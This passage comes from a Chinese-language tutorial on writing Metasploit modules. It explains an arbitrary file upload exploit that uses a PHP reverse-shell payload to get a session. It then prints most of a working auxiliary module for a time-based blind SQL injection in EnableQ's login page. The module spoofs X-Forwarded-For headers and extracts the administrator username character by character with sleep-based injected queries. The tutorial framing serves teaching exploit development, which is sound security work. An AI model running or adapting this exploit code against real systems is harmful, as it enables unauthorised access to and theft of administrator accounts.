        datastore['RPORT']
      end
      def targeturi
        datastore['TARGETURI']
      end
    end
initialize就是初始化函数,里面定义插件的基本信息,名称、描述、作者等,其中Platform指定插件适用的平台,Arch指定插件适用的框架,两者决定了payload的类型,在本例中platform我选择的是php,arch选择的是ARCH_PHP,所以供我选择的payload有
对于.net应用可以选择platform为win,arch为arch_x86。更多关于platform和arch的填写可以参考这里[http://doc.metascan.cn/](http://doc.metascan.cn/),也可以参考现有插件。
register_options是注册exp参数用的,有时可能先有参数选择不够用的,就需要自己来定义个,有时也会为了方便利用而设置个默认值,也是在这里注册,比如有个应用是用https协议的,而且端口不是80,所以为了方便,在这里就会设置两个默认参数:
    Opt::RPORT(443),
     OptBool.new('SSL', [true, 'Negotiate SSL/TLS for outgoing connections', true]),
这里就是指定默认使用HTTPS协议,端口443.
所有的payload都在modules/payloads目录下,都是ruby文件,这里以php/reverse_php
为例,文件路径为modules/payloads/singles/php/reverse_php.rb,详细代码诸位可自行去看看,这里就不浪费篇幅了,其中在初始化函数initialize中也定义了payload适用的platform和arch,亦可由此判断payload适用场景。
本例是一个任意文件上传漏洞的利用,发送请求是用的send_request_cgi函数,其中需要注意的地方为ctype的设置,ctype设置HTTP请求中的Content-Type,send_request_cgi函数的默认Content-Type是application/x-www-form-urlencoded,是最常见的POST提交数据的方式。也是浏览器的原生form表单,即在不设置 enctype 属性的情况下,那么最终就会以
application/x-www-form-urlencoded 方式提交数据。
当需要上传文件到服务器时,enctyped的值就需要设置为multipart/form-data,在本例中即是如此。在请求体中为了区分不同的片段需要设置boundary,要传输的消息体每部分都是以 –boundary
开始,紧接着内容描述信息,然后是回车,最后是字段具体内容(文本或二进制),如果传输的是文件,还要包含文件名和文件类型信息。消息主体最后以
–boundary– 标示结束
。
如下图所示
此外enctype的类型还有text/xml,application/json,具体的可以去看[http://www.aikaiyuan.com/6324.html这篇文章](http://www.aikaiyuan.com/6324.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0)。
在post请求中,因为要上传文件,所以首先REX::MIME::Message.new实例化一个对象,然后利用add_part函数填充内容(函数的定义在lib/rex/mime/message.rb中,有兴趣的可以去看下),最后将该对象转为字符串格式用以发送。
待payload上传成功,访问触发就可获得会话。
**测试:**
成功获取会话,中间配置代理查看请求过程
再来一个auxiliary模块
这是enableq的一个sqli漏洞,乌云漏洞编号为wooyun-2015-0164832,在漏洞分析中已经给出详细的利用过程,所以这个插件写起来也是很简单,直接看关键代码
    def rand_xff
      return "#{rand(1...255)}.#{rand(1...255)}.#{rand(1...255)}.#{rand(1...255)}"
    end
    def get_rand_post
      rand_respone = send_request_raw({
                                          'uri' => normalize_uri(target_uri.path, "enableq", "System", "Login.php"),
                                          'headers' =>
                                              {
                                                  "x-forwarded-for" => "#{rand_xff}"
                                              }
                                      })
      if rand_respone and rand_respone.body =~ /name="crumb" id="crumb" value="(w+)"/
        crumb = $1
        if rand_respone.headers['Set-Cookie'] =~ /PHPSESSID=(w+)/
          return crumb, $1
          endset
        else
          fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
        end
        return Exploit::CheckCode::Safe
      end
    end
    def get_username
      getres = 0
      username = ''
      crumb, session_id = get_rand_post
      print_status("start to exploit....")
      for f in (0..20)
        if getres ==2
          print_good("USERNAMR:#{username}")
          return username
        end
        getres += 1
        for i in [*'0'..'9', *'a'..'z', *'A'..'Z']
          begin
            timeout(3) do
              swapname = username
              swapname = "#{swapname}#{i}"
              hex_swapname = swapname.each_byte.map { |b| b.to_s(16) }.join
              postdata = {
                  'Action' => 'LoginSubmit',
                  'userName' => "test锦' or  administratorsID = 1 and administratorsName like 0x#{hex_swapname}25 and sleep(6)#",
                  'crumb' => "#{crumb}",
                  'remberme' => '0',
                  'userPass' => '8277e0910d750195b448797616e091ad',
              }
              send_request_cgi({
                                   'method' => 'POST',
                                   'uri' => normalize_uri(target_uri.path, "enableq", "System", "Login.php"), 
                                   'vars_post' => postdata, 
                                   'cookie' => "PHPSESSID=#{session_id}", 
                                   'headers' => 
                                       {
                                           "x-forwarded-for" => "#{rand_xff}"
                                       }
                               })
            end
          rescue TimeoutError
            getres = 0
            username = "#{username}#{i}"
            print_good("#{username}")
            sleep(3)
            break
          end
        end
      end
    end
漏洞说明中给的exp是用延时注入,所以我这里也就使用延时的方法来。
这段代码里更多的是ruby使用的问题,理解漏洞后也没啥技巧可谈。。。。
**结尾:**
模块的编写很简单,漏洞搞清楚了,写起来还是很快的,遇到不明白的可以参考别人的,也可以去翻文档看源码。
**参考:**
[http://www.rubydoc.info/github/rapid7/metasploit-framework/](http://www.rubydoc.info/github/rapid7/metasploit-framework/)
[http://drops.wooyun.org/tips/14408](http://drops.wooyun.org/tips/14408)
[http://doc.metascan.cn/](http://doc.metascan.cn/)